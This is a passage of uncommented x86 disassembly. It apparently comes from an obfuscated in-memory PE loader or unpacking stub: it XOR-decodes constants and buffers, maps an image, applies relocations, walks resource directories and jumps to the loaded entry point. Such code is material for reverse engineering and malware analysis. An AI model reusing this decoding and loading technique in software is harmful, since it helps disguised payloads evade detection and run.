  4257c3:	cmp    ecx,eax
  4257c5:	je     0x425930
  4257cb:	mov    eax,DWORD PTR [ebp-0x14]
  4257ce:	mov    DWORD PTR [ebp-0x34],eax
  4257d1:	mov    eax,DWORD PTR [ebp-0xc]
  4257d4:	add    eax,DWORD PTR [ebp-0x3c]
  4257d7:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4257de:	mov    DWORD PTR [ebp-0x14],edi
  4257e1:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4257e8:	mov    DWORD PTR [ebp-0x1c],eax
  4257eb:	mov    DWORD PTR [ebp-0x30],0xf89c85bc
  4257f2:	mov    DWORD PTR [ebp-0x8],edi
  4257f5:	mov    eax,DWORD PTR [ebp-0x4c]
  4257f8:	xor    eax,ebx
  4257fa:	add    eax,esi
  4257fc:	jmp    0x4258ef
  425801:	mov    DWORD PTR [ebp-0xe4],0xf89c85b4
  42580b:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425815:	mov    eax,DWORD PTR [ebp-0x8]
  425818:	mov    ecx,DWORD PTR [ebp-0x18]
  42581b:	xor    eax,ebx
  42581d:	add    eax,esi
  42581f:	imul   eax,ecx
  425822:	mov    ecx,DWORD PTR [ebp-0x1c]
  425825:	mov    al,BYTE PTR [eax+ecx*1]
  425828:	mov    BYTE PTR [ebp-0x1],al
  42582b:	mov    eax,DWORD PTR [ebp-0x8]
  42582e:	mov    ecx,DWORD PTR [ebp-0x18]
  425831:	xor    eax,ebx
  425833:	add    eax,esi
  425835:	imul   eax,ecx
  425838:	mov    ecx,DWORD PTR [ebp-0x54]
  42583b:	xor    ecx,ebx
  42583d:	add    eax,ecx
  42583f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425842:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f3]
  42584a:	mov    ecx,DWORD PTR [ebp-0xe4]
  425850:	xor    ecx,ebx
  425852:	lea    eax,[ecx+eax*1+0x3272f3]
  425859:	movzx  ecx,BYTE PTR [ebp-0x1]
  42585d:	xor    ecx,eax
  42585f:	mov    BYTE PTR [ebp-0x1],cl
  425862:	mov    al,BYTE PTR [ebp-0x1]
  425865:	mov    ecx,DWORD PTR [ebp-0x8]
  425868:	mov    edx,DWORD PTR [ebp-0x18]
  42586b:	xor    ecx,ebx
  42586d:	add    ecx,esi
  42586f:	imul   ecx,edx
  425872:	mov    edx,DWORD PTR [ebp-0x1c]
  425875:	mov    BYTE PTR [ecx+edx*1],al
  425878:	mov    eax,DWORD PTR [ebp-0x8]
  42587b:	mov    ecx,DWORD PTR [ebp-0x18]
  42587e:	xor    eax,ebx
  425880:	add    eax,esi
  425882:	imul   eax,ecx
  425885:	mov    ecx,DWORD PTR [ebp-0x1c]
  425888:	mov    al,BYTE PTR [eax+ecx*1]
  42588b:	mov    BYTE PTR [ebp-0x1],al
  42588e:	mov    eax,DWORD PTR [ebp-0x8]
  425891:	mov    ecx,DWORD PTR [ebp-0x18]
  425894:	xor    eax,ebx
  425896:	add    eax,esi
  425898:	imul   eax,ecx
  42589b:	mov    ecx,DWORD PTR [ebp-0x14]
  42589e:	xor    ecx,ebx
  4258a0:	add    eax,ecx
  4258a2:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258a5:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f3]
  4258ad:	mov    ecx,DWORD PTR [ebp-0xd0]
  4258b3:	xor    ecx,ebx
  4258b5:	lea    eax,[ecx+eax*1+0x3272f3]
  4258bc:	movzx  ecx,BYTE PTR [ebp-0x1]
  4258c0:	xor    ecx,eax
  4258c2:	mov    BYTE PTR [ebp-0x1],cl
  4258c5:	mov    al,BYTE PTR [ebp-0x1]
  4258c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4258cb:	mov    edx,DWORD PTR [ebp-0x18]
  4258ce:	xor    ecx,ebx
  4258d0:	add    ecx,esi
  4258d2:	imul   ecx,edx
  4258d5:	mov    edx,DWORD PTR [ebp-0x1c]
  4258d8:	mov    BYTE PTR [ecx+edx*1],al
  4258db:	mov    eax,DWORD PTR [ebp-0x30]
  4258de:	mov    ecx,DWORD PTR [ebp-0x14]
  4258e1:	xor    eax,ebx
  4258e3:	xor    ecx,ebx
  4258e5:	add    eax,esi
  4258e7:	add    ecx,esi
  4258e9:	imul   eax,ecx
  4258ec:	add    eax,DWORD PTR [ebp-0x18]
  4258ef:	mov    DWORD PTR [ebp-0x18],eax
  4258f2:	mov    eax,DWORD PTR [ebp-0x18]
  4258f5:	mov    ecx,DWORD PTR [ebp-0x34]
  4258f8:	cmp    ecx,eax
  4258fa:	jb     0x425801
  425900:	mov    eax,DWORD PTR [ebp-0x14]
  425903:	mov    ecx,DWORD PTR [ebp-0x34]
  425906:	xor    eax,ebx
  425908:	add    eax,esi
  42590a:	imul   eax,ecx
  42590d:	mov    ecx,DWORD PTR [ebp-0x4c]
  425910:	xor    ecx,ebx
  425912:	add    ecx,esi
  425914:	or     eax,ecx
  425916:	mov    ecx,DWORD PTR [ebp-0x2c]
  425919:	xor    ecx,ebx
  42591b:	add    eax,ecx
  42591d:	mov    ecx,DWORD PTR [ebp-0x2c]
  425920:	xor    ecx,ebx
  425922:	add    eax,ecx
  425924:	mov    ecx,DWORD PTR [ebp-0xc]
  425927:	lea    eax,[eax+ecx*1+0x64e5e6]
  42592e:	jmp    0x42593f
  425930:	mov    eax,DWORD PTR [ebp-0x2c]
  425933:	mov    ecx,DWORD PTR [ebp-0xc]
  425936:	xor    eax,ebx
  425938:	lea    eax,[eax+ecx*1+0x3272f3]
  42593f:	mov    DWORD PTR [ebp-0xc],eax
  425942:	mov    eax,DWORD PTR [ebp-0x2c]
  425945:	xor    eax,ebx
  425947:	mov    ecx,0xffcd8d0d
  42594c:	sub    ecx,eax
  42594e:	add    ecx,DWORD PTR [ebp-0x38]
  425951:	mov    eax,DWORD PTR [ebp-0x2c]
  425954:	mov    edx,DWORD PTR [ebp-0xc]
  425957:	xor    eax,ebx
  425959:	add    eax,esi
  42595b:	imul   eax,edx
  42595e:	cmp    eax,ecx
  425960:	jbe    0x42577b
  425966:	push   DWORD PTR [ebp+0x8]
  425969:	mov    eax,DWORD PTR [ebp+0x8]
  42596c:	push   DWORD PTR [eax+0x1cc]
  425972:	lea    eax,[ebp-0xd8]
  425978:	push   eax
  425979:	mov    eax,DWORD PTR [ebp+0x8]
  42597c:	mov    eax,DWORD PTR [eax+0x1c4]
  425982:	push   DWORD PTR [eax]
  425984:	mov    eax,DWORD PTR [ebp+0x8]
  425987:	mov    eax,DWORD PTR [eax+0x1c0]
  42598d:	push   DWORD PTR [eax]
  42598f:	push   DWORD PTR [ebp-0x40]
  425992:	push   DWORD PTR [ebp-0x24]
  425995:	call   0x42642c
  42599a:	mov    DWORD PTR [ebp-0x3c],eax
  42599d:	mov    eax,DWORD PTR [ebp-0x10]
  4259a0:	mov    ecx,DWORD PTR [ebp-0x24]
  4259a3:	xor    eax,ebx
  4259a5:	add    eax,esi
  4259a7:	cmp    eax,ecx
  4259a9:	je     0x4259ca
  4259ab:	mov    eax,DWORD PTR [ebp+0x8]
  4259ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4259b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4259b7:	xor    ecx,ebx
  4259b9:	add    ecx,esi
  4259bb:	push   ecx
  4259bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4259bf:	xor    ecx,ebx
  4259c1:	add    ecx,esi
  4259c3:	push   ecx
  4259c4:	push   DWORD PTR [ebp-0x24]
  4259c7:	call   DWORD PTR [eax+0x18]
  4259ca:	pop    edi
  4259cb:	pop    esi
  4259cc:	pop    ebx
  4259cd:	leave  
  4259ce:	ret    0x4
  4259d1:	push   ebp
  4259d2:	mov    ebp,esp
  4259d4:	push   ecx
  4259d5:	push   ecx
  4259d6:	lea    eax,[ebp-0x8]
  4259d9:	mov    DWORD PTR [ebp-0x4],eax
  4259dc:	push   esi
  4259dd:	mov    esi,DWORD PTR [ebp-0x4]
  4259e0:	mov    eax,0xf881ba2f
  4259e5:	mov    DWORD PTR [esi],eax
  4259e7:	mov    esi,DWORD PTR [ebp-0x8]
  4259ea:	cmp    esi,eax
  4259ec:	pop    esi
  4259ed:	jne    0x4259f7
  4259ef:	mov    BYTE PTR [ecx+0xa],0x83
  4259f3:	mov    BYTE PTR [edx+0x8],0x2c
  4259f7:	mov    BYTE PTR [edx+0xa],0x83
  4259fb:	mov    BYTE PTR [ecx+0x2],0x11
  4259ff:	leave  
  425a00:	ret    
  425a01:	push   ebp
  425a02:	mov    ebp,esp
  425a04:	push   ecx
  425a05:	push   ecx
  425a06:	lea    eax,[ebp-0x8]
  425a09:	mov    DWORD PTR [ebp-0x4],eax
  425a0c:	mov    edx,DWORD PTR [ebp-0x4]
  425a0f:	mov    eax,0xf88b0bcb
  425a14:	mov    DWORD PTR [edx],eax
  425a16:	mov    edx,DWORD PTR [ebp-0x8]
  425a19:	cmp    edx,eax
  425a1b:	jne    0x425a2c
  425a1d:	mov    eax,DWORD PTR [ebp+0x8]
  425a20:	mov    BYTE PTR [ecx+0x9],0xf
  425a24:	mov    BYTE PTR [eax+0x7],0x54
  425a28:	mov    BYTE PTR [ecx+0x6],0xc
  425a2c:	mov    BYTE PTR [ecx+0x3],0x1f
  425a30:	leave  
  425a31:	ret    0x4
  425a34:	push   ebp
  425a35:	mov    ebp,esp
  425a37:	push   ecx
  425a38:	push   ecx
  425a39:	lea    eax,[ebp-0x8]
  425a3c:	mov    DWORD PTR [ebp-0x4],eax
  425a3f:	mov    edx,DWORD PTR [ebp-0x4]
  425a42:	mov    eax,0x7e0da2f
  425a47:	mov    DWORD PTR [edx],eax
  425a49:	mov    edx,DWORD PTR [ebp-0x8]
  425a4c:	cmp    edx,eax
  425a4e:	jne    0x425a54
  425a50:	mov    BYTE PTR [ecx+0x7],0x54
  425a54:	mov    eax,DWORD PTR [ebp+0x8]
  425a57:	mov    BYTE PTR [ecx+0x1],0x1a
  425a5b:	mov    BYTE PTR [eax+0x9],0x2f
  425a5f:	leave  
  425a60:	ret    0x4
  425a63:	push   ebp
  425a64:	mov    ebp,esp
  425a66:	push   ecx
  425a67:	push   ecx
  425a68:	lea    eax,[ebp-0x8]
  425a6b:	mov    DWORD PTR [ebp-0x4],eax
  425a6e:	push   esi
  425a6f:	mov    esi,DWORD PTR [ebp-0x4]
  425a72:	mov    eax,0x7060e38
  425a77:	mov    DWORD PTR [esi],eax
  425a79:	mov    esi,DWORD PTR [ebp-0x8]
  425a7c:	cmp    esi,eax
  425a7e:	pop    esi
  425a7f:	jne    0x425a8b
  425a81:	mov    BYTE PTR [edx+0x4],0x10
  425a85:	mov    WORD PTR [ecx+0x3],0x101f
  425a8b:	mov    BYTE PTR [edx],0x3c
  425a8e:	leave  
  425a8f:	ret    
  425a90:	push   ebp
  425a91:	mov    ebp,esp
  425a93:	push   ecx
  425a94:	push   ecx
  425a95:	lea    eax,[ebp-0x8]
  425a98:	mov    DWORD PTR [ebp-0x4],eax
  425a9b:	mov    edx,DWORD PTR [ebp-0x4]
  425a9e:	mov    eax,0xf8870b3f
  425aa3:	mov    DWORD PTR [edx],eax
  425aa5:	mov    edx,DWORD PTR [ebp-0x8]
  425aa8:	cmp    edx,eax
  425aaa:	jne    0x425ab7
  425aac:	mov    eax,DWORD PTR [ebp+0x8]
  425aaf:	mov    BYTE PTR [ecx+0x8],0xc
  425ab3:	mov    BYTE PTR [eax+0x1],0x1a
  425ab7:	mov    BYTE PTR [ecx+0x5],0x8
  425abb:	leave  
  425abc:	ret    0x4
  425abf:	push   esi
  425ac0:	mov    ecx,edi
  425ac2:	call   0x425a90
  425ac7:	mov    edx,edi
  425ac9:	mov    ecx,esi
  425acb:	mov    BYTE PTR [esi],0x1c
  425ace:	call   0x425a63
  425ad3:	push   esi
  425ad4:	mov    ecx,edi
  425ad6:	mov    BYTE PTR [esi+0x5],0x8
  425ada:	call   0x425a34
  425adf:	push   esi
  425ae0:	mov    BYTE PTR [esi+0x6],0xc
  425ae4:	call   0x425a01
  425ae9:	mov    BYTE PTR [esi+0x2],0x11
  425aed:	mov    edx,esi
  425aef:	jmp    0x4259d1
  425af4:	push   ebp
  425af5:	mov    ebp,esp
  425af7:	push   ecx
  425af8:	mov    ecx,DWORD PTR [edx+0x194]
  425afe:	push   esi
  425aff:	mov    esi,DWORD PTR [ebp+0x8]
  425b02:	mov    esi,DWORD PTR [esi]
  425b04:	mov    DWORD PTR [ecx],esi
  425b06:	mov    ecx,DWORD PTR [edx+0x194]
  425b0c:	mov    ecx,DWORD PTR [ecx]
  425b0e:	mov    esi,DWORD PTR [edx+0x190]
  425b14:	mov    DWORD PTR [esi],ecx
  425b16:	mov    eax,DWORD PTR [edx+0x194]
  425b1c:	mov    ecx,DWORD PTR [eax]
  425b1e:	mov    ecx,DWORD PTR [ecx+0x3c]
  425b21:	add    ecx,DWORD PTR [eax]
  425b23:	mov    DWORD PTR [ebp-0x4],0xf89ca5a1
  425b2a:	mov    eax,DWORD PTR [ebp-0x4]
  425b2d:	movzx  ecx,WORD PTR [ecx+0x16]
  425b31:	xor    eax,0x75108ac
  425b36:	add    eax,0x3272f3
  425b3b:	pop    esi
  425b3c:	test   ecx,eax
  425b3e:	je     0x425b4c
  425b40:	mov    eax,DWORD PTR [edx+0x1c8]
  425b46:	mov    DWORD PTR [eax],0xf89c85a2
  425b4c:	leave  
  425b4d:	ret    0x4
  425b50:	push   ebp
  425b51:	mov    ebp,esp
  425b53:	sub    esp,0x70
  425b56:	and    DWORD PTR [ebp-0x20],0x0
  425b5a:	mov    DWORD PTR [ebp-0x18],0xf89cb5a1
  425b61:	mov    DWORD PTR [ebp-0x1c],0xf89c85e1
  425b68:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  425b6f:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425b76:	mov    DWORD PTR [ebp-0x2c],0xf89f05a1
  425b7d:	mov    eax,DWORD PTR [ebp+0x20]
  425b80:	mov    eax,DWORD PTR [eax+0x194]
  425b86:	mov    DWORD PTR [ebp-0xc],eax
  425b89:	mov    eax,DWORD PTR [ebp+0x20]
  425b8c:	push   ebx
  425b8d:	push   esi
  425b8e:	mov    esi,DWORD PTR [eax+0x190]
  425b94:	mov    eax,DWORD PTR [ebp+0x20]
  425b97:	mov    eax,DWORD PTR [eax+0x18c]
  425b9d:	mov    DWORD PTR [ebp-0x8],eax
  425ba0:	mov    eax,DWORD PTR [eax]
  425ba2:	push   edi
  425ba3:	mov    DWORD PTR [ebp-0x4],esi
  425ba6:	test   eax,eax
  425ba8:	jne    0x425bb5
  425baa:	push   DWORD PTR [ebp+0x1c]
  425bad:	mov    edx,DWORD PTR [ebp+0x20]
  425bb0:	call   0x425af4
  425bb5:	mov    eax,DWORD PTR [esi]
  425bb7:	mov    ebx,DWORD PTR [esi]
  425bb9:	add    ebx,DWORD PTR [eax+0x3c]
  425bbc:	mov    eax,DWORD PTR [ebp+0xc]
  425bbf:	mov    ecx,DWORD PTR [ebp-0x8]
  425bc2:	mov    ecx,DWORD PTR [ecx]
  425bc4:	mov    esi,0x75108ac
  425bc9:	xor    eax,esi
  425bcb:	mov    edi,0x3272f3
  425bd0:	add    eax,edi
  425bd2:	cmp    eax,ecx
  425bd4:	jne    0x425e0c
  425bda:	mov    eax,DWORD PTR [ebp-0xc]
  425bdd:	mov    eax,DWORD PTR [eax]
  425bdf:	mov    DWORD PTR [ebp-0x10],eax
  425be2:	mov    eax,DWORD PTR [ebx+0x50]
  425be5:	mov    DWORD PTR [ebp-0x68],eax
  425be8:	mov    eax,DWORD PTR [ebp-0x18]
  425beb:	xor    eax,esi
  425bed:	add    eax,edi
  425bef:	mov    DWORD PTR [ebp-0x64],eax
  425bf2:	mov    eax,DWORD PTR [ebp-0x14]
  425bf5:	and    DWORD PTR [ebp-0x6c],0x0
  425bf9:	xor    eax,esi
  425bfb:	add    eax,edi
  425bfd:	mov    DWORD PTR [ebp-0x60],eax
  425c00:	lea    eax,[ebp-0x70]
  425c03:	push   eax
  425c04:	mov    eax,DWORD PTR [ebp+0x8]
  425c07:	xor    eax,esi
  425c09:	add    eax,edi
  425c0b:	push   eax
  425c0c:	mov    eax,DWORD PTR [ebp+0x20]
  425c0f:	add    eax,0xaa
  425c14:	push   eax
  425c15:	mov    eax,DWORD PTR [ebp+0x20]
  425c18:	mov    eax,DWORD PTR [eax+0x198]
  425c1e:	mov    DWORD PTR [ebp-0x70],0x4
  425c25:	push   DWORD PTR [eax]
  425c27:	mov    eax,DWORD PTR [ebp+0x10]
  425c2a:	call   eax
  425c2c:	mov    ecx,DWORD PTR [ebp-0xc]
  425c2f:	mov    ecx,DWORD PTR [ecx]
  425c31:	mov    edx,DWORD PTR [ebp-0x8]
  425c34:	mov    DWORD PTR [ebp-0x6c],eax
  425c37:	mov    DWORD PTR [ebp+0x1c],eax
  425c3a:	mov    DWORD PTR [edx],ecx
  425c3c:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3f:	mov    DWORD PTR [ecx],eax
  425c41:	mov    eax,DWORD PTR [ebx+0x50]
  425c44:	mov    DWORD PTR [ebp-0x68],eax
  425c47:	mov    eax,DWORD PTR [ebp-0x1c]
  425c4a:	xor    eax,esi
  425c4c:	add    eax,edi
  425c4e:	mov    DWORD PTR [ebp-0x64],eax
  425c51:	lea    eax,[ebp-0x20]
  425c54:	mov    DWORD PTR [ebp-0x60],eax
  425c57:	lea    eax,[ebp-0x70]
  425c5a:	push   eax
  425c5b:	mov    eax,DWORD PTR [ebp+0x8]
  425c5e:	xor    eax,esi
  425c60:	add    eax,edi
  425c62:	push   eax
  425c63:	mov    eax,DWORD PTR [ebp+0x20]
  425c66:	add    eax,0xee
  425c6b:	push   eax
  425c6c:	mov    eax,DWORD PTR [ebp+0x20]
  425c6f:	mov    eax,DWORD PTR [eax+0x198]
  425c75:	mov    DWORD PTR [ebp-0x70],0x4
  425c7c:	push   DWORD PTR [eax]
  425c7e:	mov    eax,DWORD PTR [ebp+0x10]
  425c81:	call   eax
  425c83:	test   eax,eax
  425c85:	je     0x425caa
  425c87:	and    DWORD PTR [ebp+0xc],0x0
  425c8b:	cmp    DWORD PTR [ebx+0x50],0x0
  425c8f:	jbe    0x425caa
  425c91:	mov    eax,DWORD PTR [ebp+0x1c]
  425c94:	mov    ecx,DWORD PTR [ebp-0x10]
  425c97:	sub    ecx,eax
  425c99:	mov    dl,BYTE PTR [ecx+eax*1]
  425c9c:	inc    DWORD PTR [ebp+0xc]
  425c9f:	mov    BYTE PTR [eax],dl
  425ca1:	mov    edx,DWORD PTR [ebp+0xc]
  425ca4:	inc    eax
  425ca5:	cmp    edx,DWORD PTR [ebx+0x50]
  425ca8:	jb     0x425c99
  425caa:	mov    edx,DWORD PTR [ebp+0x1c]
  425cad:	mov    ecx,DWORD PTR [edx+0x3c]
  425cb0:	add    ecx,edx
  425cb2:	mov    eax,DWORD PTR [ecx+0xa0]
  425cb8:	mov    ebx,DWORD PTR [ecx+0x28]
  425cbb:	add    eax,edx
  425cbd:	sub    edx,DWORD PTR [ebp-0x10]
  425cc0:	add    ebx,DWORD PTR [ebp+0x1c]
  425cc3:	mov    DWORD PTR [ebp+0xc],edx
  425cc6:	mov    DWORD PTR [ebp-0x2c],ecx
  425cc9:	mov    DWORD PTR [ebp-0x14],ebx
  425ccc:	mov    DWORD PTR [ebp-0x8],0x0
  425cd3:	jmp    0x425d4f
  425cd5:	add    edx,0xfffffff8
  425cd8:	shr    edx,1
  425cda:	mov    DWORD PTR [ebp-0x18],edx
  425cdd:	je     0x425d3b
  425cdf:	lea    edx,[eax+0x8]
  425ce2:	mov    DWORD PTR [ebp-0x4],edx
  425ce5:	mov    edx,DWORD PTR [ebp-0x18]
  425ce8:	mov    DWORD PTR [ebp-0x18],edx
  425ceb:	mov    edx,DWORD PTR [ebp-0x4]
  425cee:	movzx  edx,WORD PTR [edx]
  425cf1:	mov    DWORD PTR [ebp-0x24],edx
  425cf4:	and    edx,0xfff
  425cfa:	mov    DWORD PTR [ebp-0x28],edx
  425cfd:	mov    edx,DWORD PTR [ebp-0x24]
  425d00:	shr    edx,0xc
  425d03:	add    edx,0xffcd8d0d
  425d09:	xor    edx,esi
  425d0b:	cmp    edx,0xf89c85bc
  425d11:	jne    0x425d32
  425d13:	mov    edx,DWORD PTR [ebp-0x28]
  425d16:	add    edx,DWORD PTR [ebp+0x1c]
  425d19:	mov    ebx,DWORD PTR [eax]
  425d1b:	cmp    DWORD PTR [ebx+edx*1],0x0
  425d1f:	je     0x425d2f
  425d21:	mov    ecx,DWORD PTR [ebp+0xc]
  425d24:	add    ecx,DWORD PTR [ebx+edx*1]
  425d27:	mov    ebx,DWORD PTR [eax]
  425d29:	mov    DWORD PTR [edx+ebx*1],ecx
  425d2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  425d2f:	mov    ebx,DWORD PTR [ebp-0x14]
  425d32:	add    DWORD PTR [ebp-0x4],0x2
  425d36:	dec    DWORD PTR [ebp-0x18]
  425d39:	jne    0x425ceb
  425d3b:	mov    edx,DWORD PTR [ebp-0xc]
  425d3e:	add    DWORD PTR [ebp-0x8],edx
  425d41:	mov    edx,DWORD PTR [ebp-0x8]
  425d44:	cmp    edx,DWORD PTR [ecx+0xa4]
  425d4a:	jae    0x425d5d
  425d4c:	add    eax,DWORD PTR [ebp-0xc]
  425d4f:	mov    edx,DWORD PTR [eax+0x4]
  425d52:	mov    DWORD PTR [ebp-0xc],edx
  425d55:	test   edx,edx
  425d57:	jne    0x425cd5
  425d5d:	mov    eax,DWORD PTR [ebp-0x10]
  425d60:	mov    DWORD PTR [ebp-0x6c],eax
  425d63:	mov    DWORD PTR [ebp-0x70],0x4
  425d6a:	mov    eax,DWORD PTR [ecx+0x50]
  425d6d:	mov    DWORD PTR [ebp-0x68],eax
  425d70:	mov    eax,DWORD PTR [ebp-0x1c]
  425d73:	xor    eax,esi
  425d75:	add    eax,edi
  425d77:	mov    DWORD PTR [ebp-0x64],eax
  425d7a:	lea    eax,[ebp-0x20]
  425d7d:	mov    DWORD PTR [ebp-0x60],eax
  425d80:	lea    eax,[ebp-0x70]
  425d83:	push   eax
  425d84:	mov    eax,DWORD PTR [ebp+0x8]
  425d87:	xor    eax,esi
  425d89:	add    eax,edi
  425d8b:	push   eax
  425d8c:	mov    eax,DWORD PTR [ebp+0x20]
  425d8f:	add    eax,0xee
  425d94:	push   eax
  425d95:	mov    eax,DWORD PTR [ebp+0x20]
  425d98:	mov    eax,DWORD PTR [eax+0x198]
  425d9e:	push   DWORD PTR [eax]
  425da0:	mov    eax,DWORD PTR [ebp+0x10]
  425da3:	call   eax
  425da5:	mov    eax,DWORD PTR [ebp+0x20]
  425da8:	mov    eax,DWORD PTR [eax+0x180]
  425dae:	add    eax,DWORD PTR [ebp+0xc]
  425db1:	mov    ecx,DWORD PTR [ebp+0xc]
  425db4:	push   DWORD PTR [ebp+0x18]
  425db7:	mov    DWORD PTR [eax],ecx
  425db9:	push   DWORD PTR [ebp+0x14]
  425dbc:	push   DWORD PTR [ebp+0x1c]
  425dbf:	call   ebx
  425dc1:	mov    ecx,DWORD PTR [ebp+0xc]
  425dc4:	add    ecx,DWORD PTR [ebp+0x20]
  425dc7:	lea    eax,[ebp+0x4]
  425dca:	mov    DWORD PTR [ebp+0x20],ecx
  425dcd:	mov    ecx,DWORD PTR [ebp+0x20]
  425dd0:	mov    ecx,DWORD PTR [ebp+0x20]
  425dd3:	mov    edx,DWORD PTR [ecx+0x190]
  425dd9:	mov    ecx,DWORD PTR [ebp+0x20]
  425ddc:	mov    ecx,DWORD PTR [ecx+0x18c]
  425de2:	mov    esi,DWORD PTR [ecx]
  425de4:	cmp    DWORD PTR [eax],esi
  425de6:	jb     0x425e07
  425de8:	mov    esi,DWORD PTR [edx]
  425dea:	mov    edi,DWORD PTR [edx]
  425dec:	mov    esi,DWORD PTR [esi+0x3c]
  425def:	lea    esi,[edi+esi*1+0x50]
  425df3:	mov    edi,DWORD PTR [ecx]
  425df5:	add    edi,DWORD PTR [esi]
  425df7:	cmp    DWORD PTR [eax],edi
  425df9:	jae    0x425e07
  425dfb:	mov    esi,DWORD PTR [ecx]
  425dfd:	mov    ecx,DWORD PTR [eax]
  425dff:	mov    edx,DWORD PTR [edx]
  425e01:	sub    ecx,esi
  425e03:	add    edx,ecx
  425e05:	mov    DWORD PTR [eax],edx
  425e07:	mov    eax,DWORD PTR [ebp+0xc]
  425e0a:	jmp    0x425e0e
  425e0c:	xor    eax,eax
  425e0e:	pop    edi
  425e0f:	pop    esi
  425e10:	pop    ebx
  425e11:	leave  
  425e12:	ret    0x1c
  425e15:	push   ebp
  425e16:	mov    ebp,esp
  425e18:	sub    esp,0x1c
  425e1b:	push   esi
  425e1c:	mov    esi,eax
  425e1e:	mov    eax,DWORD PTR [ecx+0x190]
  425e24:	cmp    DWORD PTR [eax],0x0
  425e27:	je     0x425f37
  425e2d:	test   edx,edx
  425e2f:	je     0x425f37
  425e35:	test   esi,esi
  425e37:	je     0x425f37
  425e3d:	mov    eax,DWORD PTR [esi+0x88]
  425e43:	test   eax,eax
  425e45:	je     0x425f32
  425e4b:	cmp    DWORD PTR [esi+0x8c],0x10
  425e52:	je     0x425f32
  425e58:	cmp    DWORD PTR [esi+0x34],edx
  425e5b:	je     0x425f32
  425e61:	mov    esi,DWORD PTR [ecx+0x18c]
  425e67:	and    DWORD PTR [ebp-0x10],0x0
  425e6b:	mov    ecx,edx
  425e6d:	sub    ecx,DWORD PTR [esi]
  425e6f:	add    eax,edx
  425e71:	movzx  edx,WORD PTR [eax+0xc]
  425e75:	mov    DWORD PTR [ebp-0x1c],ecx
  425e78:	movzx  ecx,WORD PTR [eax+0xe]
  425e7c:	add    ecx,edx
  425e7e:	je     0x425f32
  425e84:	lea    ecx,[eax+0x14]
  425e87:	push   ebx
  425e88:	mov    DWORD PTR [ebp-0x18],ecx
  425e8b:	mov    esi,0x7fffffff
  425e90:	push   edi
  425e91:	test   DWORD PTR [ecx],esi
  425e93:	je     0x425f14
  425e95:	mov    edx,DWORD PTR [ecx]
  425e97:	and    DWORD PTR [ebp-0xc],0x0
  425e9b:	and    edx,esi
  425e9d:	add    edx,eax
  425e9f:	movzx  edi,WORD PTR [edx+0xe]
  425ea3:	movzx  ebx,WORD PTR [edx+0xc]
  425ea7:	add    edi,ebx
  425ea9:	je     0x425f14
  425eab:	lea    ecx,[edx+0x14]
  425eae:	mov    DWORD PTR [ebp-0x14],ecx
  425eb1:	test   DWORD PTR [ecx],esi
  425eb3:	je     0x425ef6
  425eb5:	mov    ecx,DWORD PTR [ecx]
  425eb7:	and    DWORD PTR [ebp-0x8],0x0
  425ebb:	and    ecx,esi
  425ebd:	add    ecx,eax
  425ebf:	movzx  edi,WORD PTR [ecx+0xe]
  425ec3:	movzx  ebx,WORD PTR [ecx+0xc]
  425ec7:	add    edi,ebx
  425ec9:	je     0x425ef6
  425ecb:	lea    edi,[ecx+0x14]
  425ece:	mov    DWORD PTR [ebp-0x4],edi
  425ed1:	mov    edi,DWORD PTR [ebp-0x4]
  425ed4:	mov    edi,DWORD PTR [edi]
  425ed6:	test   edi,edi
  425ed8:	je     0x425ee0
  425eda:	mov    ebx,DWORD PTR [ebp-0x1c]
  425edd:	add    DWORD PTR [edi+eax*1],ebx
  425ee0:	movzx  edi,WORD PTR [ecx+0xe]
  425ee4:	movzx  ebx,WORD PTR [ecx+0xc]
  425ee8:	inc    DWORD PTR [ebp-0x8]
  425eeb:	add    DWORD PTR [ebp-0x4],0x8
  425eef:	add    edi,ebx
  425ef1:	cmp    DWORD PTR [ebp-0x8],edi
  425ef4:	jb     0x425ed1
  425ef6:	movzx  edi,WORD PTR [edx+0xe]
  425efa:	movzx  ebx,WORD PTR [edx+0xc]
  425efe:	mov    ecx,DWORD PTR [ebp-0x14]
  425f01:	inc    DWORD PTR [ebp-0xc]
  425f04:	add    ecx,0x8
  425f07:	add    edi,ebx
  425f09:	mov    DWORD PTR [ebp-0x14],ecx
  425f0c:	cmp    DWORD PTR [ebp-0xc],edi
  425f0f:	jb     0x425eb1
  425f11:	mov    ecx,DWORD PTR [ebp-0x18]
  425f14:	movzx  edx,WORD PTR [eax+0xe]
  425f18:	movzx  edi,WORD PTR [eax+0xc]
  425f1c:	inc    DWORD PTR [ebp-0x10]
  425f1f:	add    ecx,0x8
  425f22:	add    edx,edi
  425f24:	mov    DWORD PTR [ebp-0x18],ecx
  425f27:	cmp    DWORD PTR [ebp-0x10],edx
  425f2a:	jb     0x425e91
  425f30:	pop    edi
  425f31:	pop    ebx
  425f32:	xor    eax,eax
  425f34:	inc    eax
  425f35:	jmp    0x425f39
  425f37:	xor    eax,eax
  425f39:	pop    esi
  425f3a:	leave  
  425f3b:	ret    
  425f3c:	push   ebp
  425f3d:	mov    ebp,esp
  425f3f:	mov    ecx,DWORD PTR [ecx+0x190]
  425f45:	mov    eax,DWORD PTR [ebp+0xc]
  425f48:	sub    esp,0x10
  425f4b:	push   ebx
  425f4c:	xor    ebx,ebx
  425f4e:	push   esi
  425f4f:	push   edi
  425f50:	cmp    DWORD PTR [ecx],ebx
  425f52:	je     0x425fda
  425f58:	cmp    eax,ebx
  425f5a:	je     0x425fda
  425f5c:	cmp    DWORD PTR [eax+0x78],ebx
  425f5f:	jne    0x425f66
  425f61:	xor    eax,eax
  425f63:	inc    eax
  425f64:	jmp    0x425fdc
  425f66:	mov    eax,DWORD PTR [eax+0x78]
  425f69:	add    eax,DWORD PTR [ebp+0x8]
  425f6c:	mov    ecx,DWORD PTR [eax+0x1c]
  425f6f:	mov    edx,DWORD PTR [eax+0x24]
